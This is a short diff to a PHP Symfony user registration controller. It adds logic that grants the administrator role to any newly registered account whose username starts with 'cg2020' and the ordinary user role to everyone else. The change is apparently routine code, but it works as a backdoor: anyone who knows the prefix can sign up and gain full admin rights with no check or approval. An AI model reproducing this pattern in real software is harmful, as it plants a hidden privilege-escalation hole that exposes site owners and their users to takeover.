@@ -32,6 +32,12 @@ class RegistrationController extends AbstractController
                 )
             );
 
+            if(substr($user->getUsername(), 0, 6) === "cg2020") {
+                $user->setRoles(["ROLE_ADMIN"]);
+            } else {
+                $user->setRoles(["ROLE_USER"]);
+            }
+
             $entityManager = $this->getDoctrine()->getManager();
             $entityManager->persist($user);
             $entityManager->flush();
